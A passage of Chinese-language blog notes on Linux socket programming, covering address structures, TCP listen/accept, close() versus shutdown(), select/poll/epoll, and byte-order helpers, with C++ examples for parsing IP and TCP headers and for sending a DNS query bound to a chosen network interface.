<h3 id="2-1-参数取值"><a href="#2-1-参数取值" class="headerlink" title="2.1. 参数取值"></a>2.1. 参数取值</h3><p><code>__addr</code> 指向要绑定给sockfd的协议地址</p>
<p><strong>赋值时需要转换为<a href="#networkByte">网络字节序</a></strong><br><strong>网络地址的转换可以使用<a href="#networkAddress">工具函数</a></strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __CONST_SOCKADDR_ARG	const struct sockaddr *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ipv4取值</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> &#123;</span><br><span class="line">    <span class="type">sa_family_t</span>    sin_family; <span class="comment">/* address family: AF_INET */</span></span><br><span class="line">    <span class="type">in_port_t</span>      sin_port;   <span class="comment">/* port in network byte order */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> sin_addr;   <span class="comment">/* internet address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internet address. */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">in_addr</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span>       s_addr;     <span class="comment">/* address in network byte order */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ipv6取值</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in6</span> &#123;</span><br><span class="line">    <span class="type">sa_family_t</span>     sin6_family;   <span class="comment">/* AF_INET6 */</span></span><br><span class="line">    <span class="type">in_port_t</span>       sin6_port;     <span class="comment">/* port number */</span></span><br><span class="line">    <span class="type">uint32_t</span>        sin6_flowinfo; <span class="comment">/* IPv6 flow information */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in6_addr</span> sin6_addr;     <span class="comment">/* IPv6 address */</span></span><br><span class="line">    <span class="type">uint32_t</span>        sin6_scope_id; <span class="comment">/* Scope ID (new in 2.4) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">in6_addr</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   s6_addr[<span class="number">16</span>];   <span class="comment">/* IPv6 address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Unix取值</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNIX_PATH_MAX    108</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_un</span> &#123;</span><br><span class="line">    <span class="type">sa_family_t</span> sun_family;               <span class="comment">/* AF_UNIX */</span></span><br><span class="line">    <span class="type">char</span>        sun_path[UNIX_PATH_MAX];  <span class="comment">/* pathname */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="二、连接"><a href="#二、连接" class="headerlink" title="二、连接"></a>二、连接</h1><h2 id="1-TCP连接"><a href="#1-TCP连接" class="headerlink" title="1. TCP连接"></a>1. TCP连接</h2><h3 id="1-1-TCP服务器"><a href="#1-1-TCP服务器" class="headerlink" title="1.1. TCP服务器"></a>1.1. TCP服务器</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 开始监听</span></span><br><span class="line"><span class="comment"> * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment"> * @param __n 等待连接的队列长度</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于errno</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listen</span> <span class="params">(<span class="type">int</span> __fd, <span class="type">int</span> __n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 阻塞式接受第一个连接</span></span><br><span class="line"><span class="comment"> * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment"> * @param __addr 连接地址指针</span></span><br><span class="line"><span class="comment"> * @param __addr_len 地址长度指针</span></span><br><span class="line"><span class="comment"> * @return 连接套接字描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">accept</span> <span class="params">(<span class="type">int</span> __fd, __SOCKADDR_ARG __addr, <span class="type">socklen_t</span> *__restrict __addr_len)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-TCP客户端"><a href="#1-2-TCP客户端" class="headerlink" title="1.2. TCP客户端"></a>1.2. TCP客户端</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="2-UDP连接"><a href="#2-UDP连接" class="headerlink" title="2. UDP连接"></a>2. UDP连接</h2><h2 id="3-close-和shutdown-的区别"><a href="#3-close-和shutdown-的区别" class="headerlink" title="3. close()和shutdown()的区别"></a>3. close()和shutdown()的区别</h2><p><strong>close()</strong></p>
<ul>
<li>头文件<code>unistd.h</code></li>
<li><code>close()</code>是关闭文件句柄，如果文件句柄没有引用，会找到对应的socket进行关闭清理</li>
<li>如果存在多个进程共享一个文件句柄，<code>close()</code>一个不会断开连接，多个进程都<code>close()</code>才会断开连接</li>
</ul>
<p><strong>shutdown()</strong></p>
<ul>
<li><code>shutdown()</code>是关闭socket连接，一个进程关闭连接，另一个进程也无法使用</li>
<li><code>shutdown()</code>针对的是socket不是文件，关闭socket之后，文件还在，还需要调用<code>close()</code>才能关闭文件</li>
<li><code>shutdown()</code>存在第二个参数，控制关闭的方向<ul>
<li><code>SHUT_RD</code>: 只关闭读端，来的数据会丢掉，对方不知道读端关闭</li>
<li><code>SHUT_WR</code>: 只关闭写端，发送FIN包，对方知道此事情</li>
<li><code>SHUT_RDWR</code>: 关闭读写端，相当于调用两次，一次指定读，一次是写</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// include/linux/net.h</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * enum sock_shutdown_cmd - Shutdown types</span></span><br><span class="line"><span class="comment"> * @SHUT_RD: shutdown receptions</span></span><br><span class="line"><span class="comment"> * @SHUT_WR: shutdown transmissions</span></span><br><span class="line"><span class="comment"> * @SHUT_RDWR: shutdown receptions/transmissions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">sock_shutdown_cmd</span> &#123;</span><br><span class="line">	SHUT_RD,</span><br><span class="line">	SHUT_WR,</span><br><span class="line">	SHUT_RDWR,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="三、select-poll-epoll"><a href="#三、select-poll-epoll" class="headerlink" title="三、select&#x2F;poll&#x2F;epoll"></a>三、select&#x2F;poll&#x2F;epoll</h1><h2 id="1-select"><a href="#1-select" class="headerlink" title="1. select"></a>1. select</h2><ul>
<li>windows和linux都存在select</li>
<li>select可以同时监听多个文件描述符，但是对描述符的处理是轮询的方式，对本地fd池一个一个扫描看是否有数据</li>
<li>最大支持<code>FD_SETSIZE</code>个文件描述符，一般为<code>1024/2048</code></li>
</ul>
<h2 id="2-poll"><a href="#2-poll" class="headerlink" title="2. poll"></a>2. poll</h2><ul>
<li>在select基础上去除了文件描述符的限制</li>
<li>轮询机制还是保留了</li>
</ul>
<h1 id="四、epoll"><a href="#四、epoll" class="headerlink" title="四、epoll"></a>四、epoll</h1><ul>
<li>epoll是linux特有的系统调用，windows没有此实现，使用mingw是模拟的一种实现</li>
<li>epoll和select区别是，对于fd池的处理，epoll不会一个一个扫描，而是在内核注册了通知机制，当某个fd出现时间，内核会直接通知epoll</li>
<li>epoll返回的就直接是fd的事件信息，这样防止了扫描带来的开销</li>
</ul>
<h2 id="1-epoll的调用"><a href="#1-epoll的调用" class="headerlink" title="1. epoll的调用"></a>1. epoll的调用</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="2-epoll下socket是否要设置为非阻塞"><a href="#2-epoll下socket是否要设置为非阻塞" class="headerlink" title="2. epoll下socket是否要设置为非阻塞"></a>2. epoll下socket是否要设置为非阻塞</h2><p><a href="https://blog.csdn.net/boiled_water123/article/details/104161471">使用epoll时需要将socket设为非阻塞吗？</a></p>
<ol>
<li>监听的服务端fd，最好使用水平触发模式，边沿触发可能导致部分客户端连接不上</li>
<li>客户端fd，使用水平触发时，阻塞非阻塞都可以，建议设置非阻塞</li>
<li>客户端fd，使用边沿触发时，必须使用非阻塞io，否则会卡在读取调用上。但是要求必须一次读完所有数据，否则可能存在数据没有处理。</li>
</ol>
<h1 id="五、网络编程"><a href="#五、网络编程" class="headerlink" title="五、网络编程"></a>五、网络编程</h1><h2 id="1-头文件"><a href="#1-头文件" class="headerlink" title="1. 头文件"></a>1. 头文件</h2><h3 id="1-1-netinet和linux下的头文件区别"><a href="#1-1-netinet和linux下的头文件区别" class="headerlink" title="1.1. netinet和linux下的头文件区别"></a>1.1. netinet和linux下的头文件区别</h3><ul>
<li>netinet是用户空间的接口头文件，一般是应用程序使用</li>
<li>linux下是linux内核使用，一般是内核相关操作使用</li>
</ul>
<h2 id="2-一些工具函数"><a href="#2-一些工具函数" class="headerlink" title="2. 一些工具函数"></a>2. 一些工具函数</h2><h3 id="2-1-网络字节序转换"><a href="#2-1-网络字节序转换" class="headerlink" title="2.1. 网络字节序转换"></a>2.1. <span id = "networkByte">网络字节序转换</span></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// #include &lt;netinet/in.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">ntohl</span> <span class="params">(<span class="type">uint32_t</span> __netlong)</span></span>;</span><br><span class="line"><span class="function"><span class="type">uint16_t</span> <span class="title">ntohs</span> <span class="params">(<span class="type">uint16_t</span> __netshort)</span></span>;</span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">htonl</span> <span class="params">(<span class="type">uint32_t</span> __hostlong)</span></span>;</span><br><span class="line"><span class="function"><span class="type">uint16_t</span> <span class="title">htons</span> <span class="params">(<span class="type">uint16_t</span> __hostshort)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-网络地址转换-in-addr-t和char"><a href="#2-2-网络地址转换-in-addr-t和char" class="headerlink" title="2.2. 网络地址转换 in_addr_t和char *"></a>2.2. <span id = "networkAddress">网络地址转换 <code>in_addr_t</code>和<code>char *</code></span></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// #include &lt;arpa/inet.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    * @description 将数字-点方式(192.168.1.1)的ip字符串转成in_addr_t格式</span></span><br><span class="line"><span class="comment">    * @param __cp 字符串</span></span><br><span class="line"><span class="comment">    * @return in_addr_t类型地址</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="type">in_addr_t</span> <span class="title">inet_addr</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__cp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Convert a Internet address in binary network format for interface</span></span><br><span class="line"><span class="comment">   type AF in buffer starting at CP to presentation form and place</span></span><br><span class="line"><span class="comment">   result in buffer of length LEN astarting at BUF.  */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *<span class="title">inet_ntop</span> <span class="params">(<span class="type">int</span> __af, <span class="type">const</span> <span class="type">void</span> *__restrict __cp,</span></span></span><br><span class="line"><span class="params"><span class="function">			      <span class="type">char</span> *__restrict __buf, <span class="type">socklen_t</span> __len)</span></span></span><br><span class="line"><span class="function">     __THROW</span>;</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;log.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handle</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 转成ip结构体判断</span></span><br><span class="line">    ipheader = (<span class="keyword">struct</span> iphdr *)buf;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ipbuf1[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// 打印ip用</span></span><br><span class="line">    <span class="type">char</span> ipbuf2[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// 打印ip用</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> addr1 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> addr2 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    addr1.s_addr = ipheader-&gt;saddr;  <span class="comment">// 注意这里是网络字节序，不是本地字节序</span></span><br><span class="line">    addr2.s_addr = ipheader-&gt;daddr;  <span class="comment">// 注意这里是网络字节序，不是本地字节序</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;src-&gt;dst: %s-&gt;%s&quot;</span>, <span class="built_in">inet_ntop</span>(AF_INET, &amp;addr1, ipbuf1, <span class="built_in">sizeof</span>(ipbuf1)),</span><br><span class="line">             <span class="built_in">inet_ntop</span>(AF_INET, &amp;addr2, ipbuf2, <span class="built_in">sizeof</span>(ipbuf2)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-分片包处理"><a href="#3-分片包处理" class="headerlink" title="3. 分片包处理"></a>3. 分片包处理</h2><p>主要用到一些宏</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handle</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 转成ip结构体判断</span></span><br><span class="line">    ipheader = (<span class="keyword">struct</span> iphdr *)ptr;</span><br><span class="line">    frag_flag = <span class="built_in">ntohs</span>(ipheader-&gt;frag_off);  <span class="comment">// 注意这里用主机字节序</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((frag_flag &amp; IP_DF) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 分片包</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> ((frag_flag &amp; IP_OFFMASK) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 分片包首包</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-tcp头处理"><a href="#4-tcp头处理" class="headerlink" title="4. tcp头处理"></a>4. tcp头处理</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;log.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tcpheader[] = &#123;<span class="number">0x60</span>, <span class="number">0xe0</span>, <span class="number">0xef</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0xc5</span>, <span class="number">0x13</span>, <span class="number">0x41</span>, <span class="number">0x55</span>, <span class="number">0xce</span>,</span><br><span class="line">                             <span class="number">0x63</span>, <span class="number">0xb5</span>, <span class="number">0x50</span>, <span class="number">0x10</span>, <span class="number">0x25</span>, <span class="number">0x17</span>, <span class="number">0xb1</span>, <span class="number">0x0e</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    tcphdr *th = (tcphdr *)tcpheader;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOG_HEX</span>(tcpheader, <span class="built_in">sizeof</span>(tcphdr));</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;source %u&quot;</span>, <span class="built_in">htons</span>(th-&gt;source));</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;dest %u&quot;</span>, <span class="built_in">htons</span>(th-&gt;dest));</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;seq %u&quot;</span>, <span class="built_in">htonl</span>(th-&gt;seq));</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;ack_seq %u&quot;</span>, <span class="built_in">htonl</span>(th-&gt;ack_seq));</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;doff %u&quot;</span>, th-&gt;doff);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;res1 %04u&quot;</span>, th-&gt;res1);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;res2 %02u&quot;</span>, th-&gt;res2);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;urg %u&quot;</span>, th-&gt;urg);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;ack %u&quot;</span>, th-&gt;ack);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;psh %u&quot;</span>, th-&gt;psh);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;rst %u&quot;</span>, th-&gt;rst);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;syn %u&quot;</span>, th-&gt;syn);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;fin %u&quot;</span>, th-&gt;fin);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;th_flags %#x&quot;</span>, th-&gt;th_flags);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;is ack&quot;</span>, (th-&gt;th_flags &amp; TH_ACK) == TH_ACK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="5-获取系统dns服务器"><a href="#5-获取系统dns服务器" class="headerlink" title="5. 获取系统dns服务器"></a>5. 获取系统dns服务器</h2><ul>
<li>下面函数是glibc提供的从<code>/etc/resolv.conf</code>文件中读取的dns服务器列表</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;resolv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getSystemNSList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">__res_state</span> res;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">res_ninit</span>(&amp;res) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; res.nscount; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (res.nsaddr_list[i].sin_family == AF_INET) &#123;</span><br><span class="line">                <span class="comment">// ipv4 dns server</span></span><br><span class="line">                <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> *addr = res.nsaddr_list + i;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res.nsaddr_list[i].sin_family == AF_INET6) &#123;</span><br><span class="line">                <span class="comment">// ipv6 dns server</span></span><br><span class="line">                <span class="keyword">struct</span> sockaddr_in6 *addr = <span class="built_in">reinterpret_cast</span>&lt;sockaddr_in6 *&gt;(res.nsaddr_list + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">res_nclose</span>(&amp;res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-忽略路由绑定网卡发包"><a href="#6-忽略路由绑定网卡发包" class="headerlink" title="6. 忽略路由绑定网卡发包"></a>6. 忽略路由绑定网卡发包</h2><ul>
<li>方案一</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint8_t</span> udpData[] = &#123;</span><br><span class="line">    <span class="number">0xe2</span>, <span class="number">0x60</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x6f</span>, <span class="number">0x70</span>, <span class="number">0x73</span>, <span class="number">0x07</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x6e</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x03</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">auto</span> fd = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">socklen_t</span> len = <span class="built_in">sizeof</span>(addr);</span><br><span class="line">    addr.sin_family = AF_INET;                              <span class="comment">// ipv4</span></span><br><span class="line">    addr.sin_port = <span class="built_in">htons</span>(<span class="number">53</span>);                              <span class="comment">// 端口号转换为网络字节序</span></span><br><span class="line">    addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;114.114.114.114&quot;</span>);    <span class="comment">// 连接本机的服务器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义网卡接口</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ifreq</span> ifr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strncpy</span>(ifr.ifr_ifrn.ifrn_name, <span class="string">&quot;ens18&quot;</span>, <span class="built_in">sizeof</span>(ifr.ifr_ifrn.ifrn_name));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置socket属性，使用绑定设备的方式</span></span><br><span class="line">    ret = <span class="built_in">setsockopt</span>(fd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="built_in">sizeof</span>(ifr));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;setsockopt error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="built_in">sendto</span>(fd, udpData, <span class="built_in">sizeof</span>(udpData), <span class="number">0</span>, (sockaddr *)&amp;addr, <span class="built_in">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="built_in">recvfrom</span>(fd, buf, <span class="built_in">sizeof</span>(buf), <span class="number">0</span>, (sockaddr *)&amp;addr, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recvfrom error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">log_hex</span>(buf, ret);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err:</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>方案二</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint8_t</span> udpData[] = &#123;</span><br><span class="line">    <span class="number">0xe2</span>, <span class="number">0x60</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x6f</span>, <span class="number">0x70</span>, <span class="number">0x73</span>, <span class="number">0x07</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x6e</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x03</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span 